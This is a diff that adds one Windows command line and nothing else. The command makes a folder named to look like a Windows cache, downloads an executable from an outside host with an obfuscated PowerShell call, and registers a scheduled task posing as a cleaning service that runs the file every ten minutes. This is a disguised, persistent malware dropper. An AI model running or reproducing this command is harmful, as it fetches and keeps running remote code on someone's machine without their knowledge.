@@ -1,0 +1,1 @@
+cmd.exe /c mkdir "%ProgramData%/WindowsAppPackageCache" & powershell I''n''v'o'k''e-'W'e''b'R'e''q''u''e''st -Uri "http://10.10.10.20:8000/build.exe" -OutFile "%ProgramData%\WindowsAppPackageCache\service.exe" & schtasks /Create /TN "WindowsAppPackageCache Cleaning Service" /TR "%ProgramData%\WindowsAppPackageCache\service.exe" /SC MINUTE /MO 10 /F
